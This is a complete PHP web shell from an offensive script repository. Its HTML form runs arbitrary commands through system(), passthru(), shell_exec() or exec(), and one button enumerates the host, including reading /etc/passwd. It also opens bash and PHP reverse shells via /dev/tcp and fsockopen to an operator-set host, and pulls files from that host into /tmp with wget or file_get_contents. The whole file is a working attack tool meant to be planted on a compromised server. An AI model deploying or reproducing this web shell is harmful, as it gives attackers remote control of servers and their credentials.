<!DOCTYPE html>
<html>
<!-- Simple host exploration script: basic host enumeration using PHP -->
<!-- https://github.com/isabellecda/cyber-scripts -->
<form  method="POST">
	Command:        
	<!-- Commands sent using POST method-->
	<input type="text" name="mycmd">
        <input type="submit" name="btnPost" value="POST">
	<!-- Basic enum commands -->
	<input type="submit" name="btnEnum" value="Auto Enum">
	<!-- Executes PHP info -->
	<input type="submit" name="btnPhpInfo" value="phpinfo">
	<br><br>
	Reverse:
	<!-- Will try to get a reverse shell --> 
	<!-- Handler must be listening at the defined host and port -->
	<input type="text" name="lhost" value="192.168.80.10" size="10">
	<input type="text" name="lport" value="1234" size="5">
	<input type="submit" name="btnBash" value="Reverse Bash">
	<input type="submit" name="btnPhp" value="Reverse PHP">
	<br><br>
	HTTP Server:
	<!-- HTTP server must be available at the defined host and port -->
	<!-- File will be download from HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
	<input type="text" name="fileHost" value="192.168.80.10" size="10">
	<input type="text" name="filePort" value="1235" size="5">
	<input type="text" name="fileName" value="">
	<input type="submit" name="btnWget" value="wget">
	<input type="submit" name="btnPhpDownload" value="PHP Download">
	<br><br>
	Using:
	<!-- Defines PHP function to sent the comands. Default is system() -->
	<input type="radio" name="radio" value="system" checked="checked">system()
	<input type="radio" name="radio" value="passthru">passthru()
	<input type="radio" name="radio" value="shell_exec">shell_exec()
	<input type="radio" name="radio" value="exec">exec()
	</form>
</html>
<?php

	// TODO: Verify disabled functions 
	// https://stackoverflow.com/questions/3938120/check-if-exec-is-disabled

	// Executes a system command and exit
	function exec_cmd_and_exit($type, $cmd) {
		echo "# $cmd";
	        echo '<br><br>';
	
		switch($type) {
			case 'passthru':
				passthru("$cmd 2>&1", $return_value);
			  	($return_value == 0) or die();
				break;
			case 'shell_exec':
				echo (shell_exec("$cmd 2>&1"));
				break;
			case 'exec':
				exec("$cmd 2>&1", $array);
				foreach ($array as &$value) {
		    			echo ($value);;
				}
				break;
			default:
				system("$cmd 2>&1", $return_value);
		  		($return_value == 0) or die();			
		}
		exit();
	}


	// Calls phpinfo()
	if (isset($_REQUEST['btnPhpInfo'])) 
	{
		phpinfo();		
		exit();
	}

	// Command parameters
	$lhost = $_REQUEST['lhost'];
	$lport = $_REQUEST['lport'];

	$fileHost = $_REQUEST['fileHost'];
	$filePort = $_REQUEST['filePort'];
	$fileName = $_REQUEST['fileName'];

	$cmdType = $_REQUEST['radio'];

	echo '<br><hr><br>';

	// Verifies command buttons
	if (isset($_REQUEST['btnEnum'])) 
	{
		$cmd = "whoami; id; pwd; ip a; cat /etc/passwd";
		exec_cmd_and_exit($cmdType, $cmd);
	}

	if (isset($_REQUEST['btnBash'])) {
		$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'";
		exec_cmd_and_exit($cmdType, $cmd);
	} 

	if (isset($_REQUEST['btnPhp'])) {
        	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
		exec_cmd_and_exit($cmdType, $cmd);
	} 
	
	// Process file download
	$fileFrom = "http://$fileHost:$filePort/$fileName";
	$fileTo = "/tmp/$fileName";

	if (isset($_REQUEST['btnWget'])) {
        	$cmd = "wget $fileFrom -O $fileTo";
		exec_cmd_and_exit($cmdType, $cmd);
    	}

	if (isset($_REQUEST['btnPhpDownload'])) {
		echo "# file_put_contents($fileTo, file_get_contents($fileFrom))";
		echo '<br><br>';
        	if (file_put_contents($fileTo, file_get_contents($fileFrom))) {
			echo 'File downloaded successfully!';
		} else {
			echo 'File downloading failed.';
		}
		exit();
    	}

	// Default cmd exec
	$cmd = $_REQUEST['mycmd'];
	exec_cmd_and_exit($cmdType, $cmd);

?>
